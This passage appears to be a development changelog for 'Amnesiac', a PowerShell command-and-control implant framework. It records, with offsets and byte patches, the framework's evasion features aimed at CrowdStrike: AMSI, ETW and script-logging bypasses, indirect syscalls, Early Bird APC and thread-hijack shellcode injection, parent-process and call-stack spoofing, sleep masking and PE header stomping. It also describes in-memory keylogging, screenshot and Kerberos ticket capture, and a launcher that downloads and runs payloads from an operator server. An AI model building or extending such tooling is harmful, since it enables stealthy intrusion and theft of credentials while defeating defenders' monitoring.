  - *Context: CrowdStrike has a ~3 minute behavioral analysis window after process creation. Jitter breaks timing-based correlation between payload execution and pipe connection.*
- Gzip compression of entire payload + mixed-case .NET method names in decompressor
  - *Context: Compression eliminates readable strings from the payload. Mixed-case methods (`FROmbAsE64StRiNg`) break static string signatures on the decompressor wrapper.*
- `[scriptblock]::Create($d).Invoke()` instead of `$d|IEX` in decompressor
  - *Context: `IEX` in any form is a detection indicator. Scriptblock creation and invocation is functionally equivalent but less scrutinised.*
- Assembly load for `System.Core` before pipe type instantiation
  - *Context: Ensures `System.IO.Pipes` is available on targets where the assembly might not be pre-loaded in the PS session.*

---

## [Implemented] — Layer 0: AMSI/ETW/SBL Bypass Catalog
> Commit: `1820d49`

**Added `Get-AmsiBypassSnippet -Technique <name>`**
- Techniques: `fail` (amsiInitFailed reflection), `direct` (AmsiScanBuffer byte patch via Add-Type P/Invoke), `pageguard` (PAGE_GUARD + VEH — calls `[AmnesiacLoader.Bypass]::PatchAmsiPageGuard()`), `hwbp` (DR0 hardware breakpoint — calls `[AmnesiacLoader.Bypass]::PatchAmsiHardwareBreakpoint()`)
- *Context: A catalog of independently selectable AMSI bypass techniques lets operators pick the approach that matches the target's AV version and monitoring posture. The `pageguard` and `hwbp` techniques require no byte modification of AmsiScanBuffer — they are harder to detect via memory integrity checks.*

**Added `Get-EtwBypassSnippet -Technique <name>`**
- Techniques: `provider` (PSEtwLogProvider ETW field zeroing via reflection), `patch` (EtwEventWrite byte patch via `[AmnesiacLoader.Bypass]::PatchEtwEventWrite()`), `thread` (per-thread ETW suppression)
- *Context: ETW is CrowdStrike's primary telemetry source for PS script visibility. The three techniques cover different scopes: provider-level affects the PS host, patch-level affects the ntdll function, thread-level affects only the calling thread.*

**Added `Get-SblBypassSnippet -Technique <name>`**
- Techniques: `scriptblock` (ScriptBlock.checkScriptBlockLoggingCache = false), `module` (module logging flag clear)
- *Context: Script block logging (Event ID 4104) records script content. Disabling it prevents forensic recovery of delivered payloads from the Windows Event Log.*

---

## [Implemented] — Layer 1: Disk Elimination
> Commits: `2c7b8f8`, `2c738b3`, `52a33a1`

**Replaced unconditional folder creation with `Initialize-DiskStructure`**
- `C:\Users\Public\Documents\Amnesiac\` and eight subfolders are only created when `$global:DiskMode = $true`
- `diskmode off` is the new default — zero disk writes at startup
- *Context: Creating a well-known directory tree on startup is an IOC. The directory name alone triggers detections in some environments. Default should be no artifacts on disk.*

**Added `diskmode [on|off]` command**
- `diskmode on` restores original behaviour (creates folder structure, writes logs to disk)
- `diskmode off` (default) keeps all captures in memory only
- *Context: Operators doing internal lab testing may want disk artifacts for debugging. `diskmode on` preserves that capability without making it the default.*

**Added `$global:AmnesiacArtifacts` in-memory store**
- Hashtable with keys: `Keylogger`, `Screenshots`, `Clipboard`, `TGTs`, `Downloads`
- Keylogger output, screenshots, clipboard data, TGT data buffered in operator memory
- *Context: Data captured on targets must return to the operator, but writing it to disk on the target or operator machine creates forensic evidence. In-memory buffering on operator side is the right default.*

**Added `artifacts` session command**
- Lists all in-memory artifact types and counts
- Shows keylogger line count, screenshot count, clipboard snippet count, TGT entries, download entries
- *Context: Operators need visibility into what has been captured before deciding whether to persist it.*

**Added `save <type>` session command**
- Types: `keylogger`, `screenshots`, `clipboard`, `tgts`, `all`
- Writes only the requested artifact type to disk (requires `diskmode on` or uses a temp path)
- *Context: Operators need to selectively persist captured data without a blanket disk-write policy.*

**Gated `exe` payload format behind `diskmode`**
- Warns and blocks if operator tries to use `exe` format with `diskmode off`
- *Context: The exe format writes a compiled binary to disk. Incompatible with the disk-free operational model — requires explicit opt-in.*

---

## [Implemented] — Layer 2: Payload Extensions
> Commits: `3086509`, `5121cb1`, `ff16ca6`

**Session-unique `EndMarker` and `BufferSize`**
- `$global:EndMarker` = random 8-char alphanumeric string (replaces all hardcoded `#END#`)
- `$global:BufferSize` = random from {512, 1024, 2048, 4096} (replaces hardcoded 1028)
- All pipe read/write loops and payload generation reference these globals
- *Context: The fixed string `#END#` and 1028-byte buffer are fingerprints that network and memory scanners can use to identify Amnesiac sessions. Session-unique values eliminate this static indicator.*

**Added `New-PayloadScript` modular builder**
- Parameters: `-AmsiTechnique`, `-EtwTechnique`, `-SblTechnique`, `-Obfuscation` (0–3), `-JitterMs`, `-EnvKeys` hashtable, `-Launcher`
- Assembles bypass snippets, jitter, env-key checks, pipe client code, gzip+base64 wrapper, and launcher wrapper in sequence
- Replaces `New-StealthScript` as the canonical payload generator
- *Context: The original `New-StealthScript` was monolithic and couldn't be extended without rewriting it. The builder model allows independent selection of bypass techniques, obfuscation levels, and launcher types.*

**Added `Get-PayloadLauncher -Vector <name>`**
- Vectors: `ps` (powershell.exe -EncodedCommand), `wmi` (WMI one-liner), `schtask` (schtasks /create), `com` (Shell.Application COM object)
- Returns a launcher string wrapper for the gzip payload
- *Context: CS process tree analysis is one of its strongest detection mechanisms. `powershell.exe` spawned by `cmd.exe` or `sc.exe` is high-signal. Launching via WMI (`WmiPrvSE.exe` parent) or Task Scheduler (`svchost.exe` parent) significantly reduces the behavioral score.*

**Added `launcher` command**
- Cycles through `ps → wmi → schtask → com` vectors
- Current vector shown in prompt / OPSEC banner
- *Context: Same as above — operators need to switch launch vectors between targets.*

**Added AES-128 CBC pipe channel encryption**
- `Protect-PipeMessage`: encrypts a string with AES-128 CBC, prepends IV, returns base64
- `Unprotect-PipeMessage`: decodes base64, extracts IV prefix, decrypts
- `Get-PskDerivedKey`: SHA-256 hash of passphrase, first 16 bytes used as AES key
- *Context: Named pipe data traverses SMB in plaintext unless SMB signing/sealing is enforced. A session-level AES encryption layer ensures command content is not visible to network monitoring even if SMB traffic is inspected.*

**Wired `New-PayloadScript` into `Start-Listener` and `Start-GListener`**
- `stealth` format now calls `New-PayloadScript` instead of `New-StealthScript`
- All payload generation goes through the builder — consistent bypass technique selection
- *Context: Ensures the OPSEC-configured bypass techniques actually appear in generated payloads.*

**Added `Send-Module` framing protocol**
- Streams tool source (or binary base64) over the named pipe in fixed-size chunks with `CHUNK:` / `ENDCHUNK` framing
- Target reassembles chunks and executes via `[scriptblock]::Create()` (for PS) or `[Reflection.Assembly]::Load()` (for binary)
- *Context: The target never fetches anything from the network and never writes anything to disk. The entire tool execution happens in target memory.*

---

## [Implemented] — Layer 3: In-Memory Tool Delivery
> Commits: `ecad16c`, `ff16ca6`

**Added `$global:ToolCache` hashtable**
- Populated at startup from embedded blobs, then local `Tools\` directory
- Keys are tool names; values are PS source strings or binary base64 blobs
- *Context: The current model downloads tool scripts from GitHub to the target's disk on demand. This creates both a disk IOC and anomalous outbound traffic — a near-certain EDR alert.*

**Added `Initialize-ToolCache` function**
- Loads embedded core tools (gzip+base64 blobs baked into Amnesiac.ps1)
- Scans local `Tools\` directory and adds all `.ps1` files to the cache
- Reports cache size to OPSEC banner
- *Context: All tools pre-loaded at operator startup means no network activity during an engagement.*

**Added `New-EmbeddedTool` helper**
- Gzip-compresses and base64-encodes a tool file for embedding as a constant
- Used during development to produce the embedded core tool blobs
- *Context: Embedding tools in the main script eliminates the dependency on the local Tools\ directory.*

**Embedded core tool tier in Amnesiac.ps1**
- Tools embedded as gzip+base64 constants: `SimpleAMSI`, `NETAMSI`, `Token-Impersonation`, `Invoke-SMBRemoting`, `Invoke-WMIRemoting`, `Find-LocalAdminAccess`
- *Context: These six tools are used in virtually every engagement. Embedding guarantees availability with zero network dependency.*

**Added `modules` and `modules reload` commands**
- `modules`: lists all tools in `$global:ToolCache` with source tier (embedded/local)
- `modules reload`: rescans `Tools\` directory and updates cache
- *Context: Operators need visibility into which tools are available before needing them mid-engagement.*

---

## [Implemented] — Layer 4: Operational Guardrails
> Commits: `c64ba46`

**Added `engagement [nondomained|domained|reset]` command**
- `nondomained`: sets defaults for non-domain-joined operator (named pipe listener mode, detached flag guidance)
- `domained`: sets defaults for assumed-breach scenario
- `reset`: clears profile back to unconfigured
- Profile stored in `$global:EngagementProfile`
- *Context: Non-domain-joined and assumed-breach scenarios have different requirements. Manually configuring these each session is error-prone.*

**Added `Test-NetworkLogonToken` function**
- Checks calling process token for logon type 9 (NewCredentials) — set by `runas /netonly`
- Returns `$true` if a network logon token is present, `$false` otherwise
- Called at startup in `nondomained` mode; warns if token is missing
- *Context: Operating against a domain from a non-joined machine requires a Kerberos ticket in the token. If the operator forgot to use `runas /netonly`, all domain operations will silently fail. Early detection prevents wasted time.*

**Added `key <hostname|domain|user> <value>` and `key clear` commands**
- Stores env key values in `$global:EnvKeys` hashtable
- Keys are embedded into payload by `New-PayloadScript` as pre-execution checks
- Payload refuses to run if hostname/domain/username doesn't match
- *Context: Accidental payload execution on the wrong machine wastes a callback opportunity, creates noise, and may alert the target organisation. Environment keying ensures the payload only executes on the intended target.*

**Added `psk <passphrase>` command**
- Derives AES-128 key from passphrase via SHA-256 + truncate to 16 bytes
- Stores in `$global:PipeKey` for use by `Protect-PipeMessage` / `Unprotect-PipeMessage`
- *Context: Same as AES pipe encryption motivation — PSK management is the operator-facing interface for that system.*

**Added `Show-OpsecBanner` function**
- Displays at Amnesiac startup: disk mode, engagement profile, token status, tool cache count, session EndMarker/BufferSize, launcher vector, loader status
- *Context: Operators need to confirm their OPSEC configuration is correct before generating payloads. A single-screen summary at startup prevents configuration mistakes.*

---

## [Implemented] — Layer 2b: AmnesiacLoader C# Assembly
> Commit: `e5d4f45` | DLL: 23040 bytes | SHA256: `E68860E9D094150AA58AE4BFF601D65C41923B5BB28330F2AF3CE85D87E96A11`

**Rewrote `AmnesiacLoader/Build.ps1`**
- Uses `csc.exe` (`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`) — no .NET SDK required
- Creates `bin\` directory before compilation
- Compiles all six source files with `/unsafe /optimize+ /debug-`
- Adds `/r:System.Core.dll` for `AesManaged` (required for SleepMask)
- Writes updated `$AmnesiacLoaderB64` back to `Amnesiac.ps1` with UTF-8 BOM preserved
- *Context: The target operator machine has no .NET SDK. csc.exe ships with .NET Framework and is available on any Windows machine with PS installed.*

**Implemented `AmnesiacLoader/Bypass.cs`**
- `PatchAmsiPageGuard()`: sets PAGE_GUARD on `AmsiScanBuffer`, installs VEH that intercepts STATUS_GUARD_PAGE_VIOLATION — sets RAX=0 (S_OK), writes 1 to the AMSI_RESULT pointer (6th arg at [RSP+0x30]), redirects RIP to return address, re-applies PAGE_GUARD. No byte modification of the function.
- `PatchAmsiHardwareBreakpoint()`: sets DR0 to `AmsiScanBuffer` via helper thread (suspend/GetContext/SetContext/resume on calling thread), VEH catches EXCEPTION_SINGLE_STEP — same RAX/result/RIP manipulation as pageguard handler.
- `PatchEtwEventWrite()`: byte-patches `EtwEventWrite` in ntdll to `31 C0 C3 90` (xor eax,eax; ret; nop) after making the page PAGE_READWRITE.
- *Context: PAGE_GUARD and hardware breakpoint techniques leave no trace in AmsiScanBuffer bytes — integrity checks that scan for patched bytes find nothing. ETW patch is the most reliable method when the process starts with low scrutiny.*

**Implemented `AmnesiacLoader/Loader.cs`**
- `SyscallResolver`: walks ntdll EAT (DataDirectory[0] at PE32+ offset `peOffset + 0x88`), builds sorted list of Nt* RVAs for Halo's Gate neighbor scanning. Extracts SSN from unhooked `4C 8B D1 B8 xx xx 00 00` prelude; falls back to ±20 neighbor scan to derive SSN by offset for hooked stubs. Allocates 33-byte RWX syscall stubs with a spoofed ntdll return frame (gadget from `CallStack.GetGadget()`) pushed before the syscall instruction.
- `Injector.InjectShellcode(pid, shellcode)`: opens target process via `NtOpenProcess` stub, allocates RW region via `NtAllocateVirtualMemory`, writes shellcode via `NtWriteVirtualMemory`, protects RX via `NtProtectVirtualMemory`, finds a thread via `CreateToolhelp32Snapshot`, suspends via `NtSuspendThread`, hijacks RIP via `NtGetContextThread`/`NtSetContextThread`, resumes.
- `Injector.InjectNewProcess(processPath, shellcode, spoofParentPid)`: PPID spoof via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` in `STARTUPINFOEX` (GCHandle.Alloc pinned parent handle for stable pointer during `UpdateProcThreadAttribute`), creates process `CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT`, allocates+writes+protects shellcode via NT stubs, queues shellcode as Early Bird APC via `NtQueueApcThread`, resumes main thread.
- *Context: CS monitors specific Win32 API call patterns at the kernel level. Indirect syscalls bypass userland hooks and produce call chains that look like legitimate ntdll operations. Early Bird APC fires before any user code — the process is fully suspended when the APC is queued, so CS sees no suspicious code execution from a running thread.*

**Implemented `AmnesiacLoader/CallStack.cs`**
- `GetGadget()`: scans ntdll `.text` section for a `RET` (0xC3) byte preceded by `NOP` (0x90) or `RET` or `POP RBP` (0x5D) or `POP RBX` (0x5B). Returns stable gadget address cached across calls.
- Gadget address inserted by `SyscallResolver.AllocateStub()` as a fake return address before the syscall instruction, producing a one-frame spoof chain pointing into legitimate ntdll code.
- *Context: CS telemetry records the call stack at injection events. A call stack originating from PS internals is high-signal. Spoofed frames showing ntdll origin reduces the behavioral score.*

**Implemented `AmnesiacLoader/SleepMask.cs`**
- `MaskedSleep(ms, regionBase, regionSize)`: generates random AES-128 key+IV via `RNGCryptoServiceProvider`, stores in a separate `VirtualAlloc(READWRITE)` key page, reads region bytes via `Marshal.Copy`, AES-128 CBC PKCS7 encrypts via `AesManaged`, writes ciphertext to region (RW temporarily via `VirtualProtect`), marks region `PAGE_NOACCESS`, sleeps, restores RW, decrypts in-place, zeroes+frees key page, `Array.Clear()` on all key material.
- *Context: CS performs memory scanning for known shellcode patterns. If the implant's memory is encrypted and marked non-accessible during sleep, the scanner finds nothing. Critical for long-dwell operations.*

**Implemented `AmnesiacLoader/Stomper.cs`**
- `ConcealLoadedAssembly(asm, targetDllName)`: gets CLR-allocated base via `Marshal.GetHINSTANCE(asm.ManifestModule)`, finds donor DLL via `GetModuleHandle` (preferred name or auto-select from: bcryptprimitives, msasn1, cryptsp, wldp, profapi, combase), reads donor PE header size (DOS + NT headers + section table, rounded to page boundary), copies donor header bytes over assembly header after `VirtualProtect(PAGE_READWRITE)`.
- *Context: A `[Reflection.Assembly]::Load(bytes)` result shows as an anonymous heap allocation to memory scanners. Overwriting the PE header with a legitimate DLL's header makes it appear file-backed.*

**Implemented `AmnesiacLoader/UnmanagedPS.cs`**
- `InjectUnmanagedPS(pid, psScript)`: runs `psScript` in the current process via SMA Runspace (finds or loads `System.Management.Automation` from AppDomain/GAC, creates Runspace via reflection, opens, creates pipeline, invokes, closes).
- `SpawnUnmanagedPS(processPath, psScript, spoofParentPid)`: UTF-16LE base64-encodes `psScript`, builds `powershell.exe -EncodedCommand` bootstrap, delivers via `InjectNewProcess`.
- *Context: Running PS code in-process via SMA Runspace avoids spawning `powershell.exe` — which is a high-signal process creation event. The target's already-loaded AmnesiacLoader instance can execute arbitrary PS code without creating a new process.*

**Embedded `$AmnesiacLoaderB64` constant in `Amnesiac.ps1`**
- 30720-char base64 blob representing the compiled 23040-byte DLL
- `Show-OpsecBanner` reports embedded size in KB
- *Context: If the assembly were written to disk as a DLL, it would be scanned on write and create a forensic artifact. Embedding in the PS script and loading from memory bypasses both.*

**Added `load loader` session command**
- Delivers `$AmnesiacLoaderB64` to an active session via `Send-Module` framing protocol
- Target loads via `[Reflection.Assembly]::Load([Convert]::FromBase64String($b64))`
- Calls `[AmnesiacLoader.Stomper]::ConcealLoadedAssembly($_la)` immediately after to conceal the loaded assembly
- *Context: The assembly must be loaded on the target before any AmnesiacLoader methods can be called. `load loader` is the one-step delivery command.*

**Added `Migrate ps <pid>` and `Migrate ps new <proc>` session commands**
- `Migrate ps <pid>`: calls `[AmnesiacLoader.Injector]::InjectUnmanagedPS($pid, $payload)` on target
- `Migrate ps new <proc>`: calls `[AmnesiacLoader.Injector]::SpawnUnmanagedPS($proc, $payload, $ppid)` with explorer.exe as PPID
- *Context: Operators need to migrate the implant to a different process or spawn a clean process. The `ps` sub-commands use CLR hosting; other `Migrate` sub-commands use shellcode injection.*

---

## [Implemented] — Plan 4: Amnesiac_ShellReady.ps1 Sync

Ported all stealth-overhaul changes (Plans 1-3) to `Amnesiac_ShellReady.ps1`:

- **Preamble**: Prepended `$AmnesiacLoaderB64` constant and 14 helper functions (`Get-AmsiBypassSnippet`, `Get-EtwBypassSnippet`, `Get-SblBypassSnippet`, `New-PayloadScript`, `Get-PayloadLauncher`, `Initialize-DiskStructure`, `Initialize-ToolCache`, `New-EmbeddedTool`, `Send-Module`, `Test-NetworkLogonToken`, `Protect-PipeMessage`, `Unprotect-PipeMessage`, `Get-PskDerivedKey`, `Show-OpsecBanner`) -- ShellReady transform applied (Write-Output, no colour params, `-` for box-drawing, `--` for em-dash)
- **Initialization**: Replaced inline folder-creation block with `Initialize-DiskStructure`; added stealth-overhaul globals (`$global:DiskMode`, `$global:AmnesiacArtifacts`, `$global:ToolCache`, `$global:EndMarker`, `$global:BufferSize`, `$global:PayloadConfig`, `$global:EngagementProfile`, `$global:PSKPhrase`, `$global:PSKBytes`); added `Initialize-ToolCache` and `Show-OpsecBanner` calls
- **Protocol constants**: Replaced 66 x `"#END#"` (both operator-side equality checks and target-script embedded sends) with `$global:EndMarker`; replaced 25 x `1028` with `$global:BufferSize`
- **Main loop**: Updated `toggle` to include `stealth` format cycling and `exe` DiskMode warning; added handlers for `diskmode`, `artifacts`, `save`, `modules`, `payload`, `psk`, `engagement`
- **Session loop**: Updated session `toggle` to include `stealth` format; added `load loader`, `Migrate ps new <path>`, `Migrate ps <pid>` handlers before the existing `Migrate *` handler

---

---

## [Implemented] — Plan 3: Fixes, Multi-Frame Call Stack, Extended Tests

**Fixed `load loader` delivery path** (commit: `fix(loader): load loader`)
- Removed broken framing-chunk-then-load-command sequence: chunks were sent before `$loadCmd` tried to read them, leaving the pipe dry; then a redundant second send was attempted after the operator blocked waiting for a response that never arrived
- Replaced with a single direct pipe write: `$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));[AmnesiacLoader.Stomper]::ConcealLoadedAssembly($_la)`
- *Context: The previous implementation was silently a no-op on the target — AmnesiacLoader was never loaded despite the operator seeing a success message. This fix makes `load loader` actually work.*

**Multi-frame call stack spoofing** (commit: `feat(loader): multi-frame call stack spoofing`)
- `CallStack.cs`: Added `GetKernelbaseGadget()` — scans `kernelbase.dll` .text section for RET gadget using shared `FindGadgetInModule()` helper; falls back to ntdll gadget if kernelbase not loaded
- `Loader.cs`: Changed `AllocateStub(ssn, ntdllGadget, kbaseGadget)` — stub now 48 bytes; pushes two fake frames: kernelbase gadget at [rsp+8] (outermost) and ntdll gadget at [rsp] (adjacent to syscall); call stack at syscall shows `[kernelbase] -> [ntdll] -> syscall`
- Rebuilt and re-embedded AmnesiacLoader DLL (23552 bytes vs prior 23040)
- *Context: A single ntdll RET gadget as the only spoofed frame is identifiable — legitimate Windows API call chains have multiple frames through kernelbase/kernel32. Two levels is meaningfully more convincing.*

**Extended Pester test coverage** (commits: `test: extend coverage`, `test: fix test quality issues`)
- `Migrate ps <pid>` and `Migrate ps new <proc>` regex patterns: 4 tests
- `Send-Module` framing protocol with mock writer/reader: cache miss returns false, correct BEGIN/CHUNK/END framing, chunk decodes to original content, EndMarker ack returns true: 4 tests
- AmnesiacLoader build artifact integrity: bin directory, DLL exists, MZ header, `$AmnesiacLoaderB64` matches on-disk DLL: 4 tests
- `load loader` command handler: blob non-null, single direct send with `::Load` and `ConcealLoadedAssembly`, no framing markers: 2 tests
- Test quality: $Matches capture before Should, base64 round-trip content assertion, __MODULE_BEGIN__ byte-length field assertion, BeforeEach ToolCache isolation, BeforeAll for build artifact scope
- *Total: 28 → 42 tests*

---


---

## [2026-05-25] feat(native-bypass): compile patchless AMSI+ETW bypass binaries locally

### Background
The msi-pageguard-veh-master directory contains the native patchless AMSI+ETW bypass
(PAGE_GUARD VEH technique). These binaries are NOT hosted on public GitHub to avoid
VirusTotal indexing. They must be compiled locally and served from the operator HTTP server.

### Build blockers resolved
- **Windows 11 SDK 10.0.26100.0** dropped metahost.h and mscoree.h (CLR hosting headers
  removed since ~SDK 19041). Fix: wrote minimal shim headers in the source directory.
- **metahost.h shim** — defines ICLRMetaHost, ICLRRuntimeInfo, CLRCreateInstance,
  all GUIDs. Includes local mscoree.h instead of the missing system header.
- **mscoree.h shim** — defines ICorRuntimeHost with correct 19-method vtable order
  (matches published COM spec: CreateLogicalThreadState...CurrentDomain). Defines
  CLSID_CorRuntimeHost, IID_ICorRuntimeHost.
- **guids.cpp** — defines all five CLSID/IID values as EXTERN_C const (CLSID_CLRMetaHost,
  IID_ICLRMetaHost, IID_ICLRRuntimeInfo, CLSID_CorRuntimeHost, IID_ICorRuntimeHost).
  Required because shim headers declare them extern but do not define them.
- **mscoree.lib missing** — not in SDK 26100. Generated from mscoree.def using lib.exe
  /def:mscoree.def /machine:x64. Def file lists the exports actually present in
  C:\Windows\System32\mscoree.dll.
- **mscorlib.tlb** — copied from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ to
  source directory so #import "mscorlib.tlb" resolves.
- **AmnesiacBridge.cs — InitialSessionState.ExecutionPolicy not in PS5.1 SMA** —
  ExecutionPolicy property was added in PowerShell Core 6.0. Fix: removed the property
  assignment; added Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted -Force
  via a separate PowerShell.Create() call before the main script run.
- **AmnesiacBridge.cs — C# 6+ syntax** — the old csc.exe in .NET Framework 4.0 does not
  support expression-bodied members. Fix: use Roslyn csc.exe from VS2022 Build Tools
  (MSBuild\Current\Bin\Roslyn\csc.exe) with /langversion:7.3.

### Outputs (all local, not committed to repo)
- msi_bypass.dll (103 KB) — injectable DLL: PAGE_GUARD bypass only, no CLR dependency
- msi_bypass_test.exe (138 KB) — standalone test: decodes XOR+b64 payload from data.txt,
  installs bypass, loads .NET assembly via CLR hosting, invokes entry point
- mnesiac_launcher.exe (140 KB) — full operator launcher: downloads AmnesiacBridge.dll +
  Amnesiac_ShellReady.ps1 from operator HTTP server, installs AMSI+ETW bypass, starts CLR,
  loads bridge into AppDomain, runs Amnesiac interactively via PS Runspace
- AmnesiacBridge.dll (10 KB) — C# Runspace host: ConsoleHost/ConsoleUI/ConsoleRawUI
  wrappers, Launcher.Run(string) entry point called by native CLR hosting code

### Reproducibility
Build-Native.ps1 in the source directory contains all build commands. Run from PowerShell
as: cd amsi-pageguard-veh-master; .\Build-Native.ps1
